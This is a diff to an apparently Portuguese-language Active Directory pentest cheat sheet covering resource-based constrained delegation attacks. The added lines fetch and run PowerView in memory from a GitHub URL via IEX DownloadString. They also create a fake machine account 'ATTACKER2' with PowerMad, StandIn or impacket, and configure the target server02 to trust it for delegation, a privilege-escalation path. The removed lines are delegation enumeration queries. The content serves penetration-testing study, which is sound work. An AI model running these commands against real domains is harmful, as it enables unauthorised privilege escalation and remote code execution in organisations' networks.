@@ -1518,6 +1518,9 @@ StandIn.exe --object ms-DS-MachineAccountQuota=*
 ```
 ##### RESOURCE-BASED CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH GENERICWRITE, GENERICALL
 ```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+```
+```
 Find-Find-InterestingDomainAcl
 Find-InterestingDomainAcl | ?{$_.IdentityReferenceClass -eq 'computer'}
 Find-InterestingDomainAcl | ?{$_.IdentityReferenceClass -eq 'user'}
@@ -1533,58 +1536,32 @@ IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cia
 ```
 CRIAR UMA CONTA FALSA DE COMPUTADOR
 ```
-New-MachineAccount -MachineAccount ATTACKERTMP -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+New-MachineAccount -MachineAccount ATTACKER2 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
 ```
 OU USAR O STANDIN
 ```
-StandIn.exe --computer Desktop-Pentestlab --make
+StandIn.exe --computer ATTACKER2 --make
 ```
 OU USAR O IMPACKET
 ```
-impacket-addcomputer -method SAMR -computer-name Pentestlab$ -computer-pass Password123 purple.lab/pentestlab:Password1234
+impacket-addcomputer -method SAMR -computer-name ATTACKER2$ -computer-pass Password123 purple.lab/pentestlab:Password1234
 ```
-
-
-
-
-##### RESOURCE-BASED CONSTRAINED DELEGATION - FIND COMPUTERS AND USERS WITH RESOURCE-BASED CONSTRAINED DELEGATION
-ENCONTRAR APENAS COMPUTADORES
+##### RESOURCE-BASED CONSTRAINED DELEGATION - VERIFICAR SE A CONTA FALSA FOI CRIADA
 ```
-$FormatEnumerationLimit=-1
-Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
-Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+Get-ADComputer -identity ATTACKER2 -Properties *
+Get-ADComputer -identity ATTACKER2 -Properties * | select Samaccountname, Enabled
 ```
-ENCONTRAR APENAS USUARIOS
 ```
-$FormatEnumerationLimit=-1
-Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
-Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
+Get-DomainComputer ATTACKER2
 ```
-ENCONTRAR COMPUTADORES E USUARIOS
+##### RESOURCE-BASED CONSTRAINED DELEGATION - CONFIGURAR DELEGAÇÃO RBCD NO ALVO PARA NOSSO FALSO COMPUTADOR
 ```
-$FormatEnumerationLimit=-1
-Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
-Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | fl | Out-String -Width 4096
-Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+Set-ADComputer server02 -PrincipalsAllowedToDelegateToAccount ATTACKER2$
 ```
-ENCONTRAR APENAS COMPUTADORES (POWERVIEW)
+##### RESOURCE-BASED CONSTRAINED DELEGATION - VERIFICAR DELEGAÇÃO RBCD
 ```
-$FormatEnumerationLimit=-1
-Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
-Get-DomainComputer -TrustedToAuth
+Get-ADComputer server02 -Properties PrincipalsAllowedToDelegateToAccount
 ```
-ENCONTRAR APENAS USUARIOS (POWERVIEW)
-```
-$FormatEnumerationLimit=-1
-Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
-Get-DomainUser -TrustedToAuth
-```
-
-
-
-
-
-
 
 
 
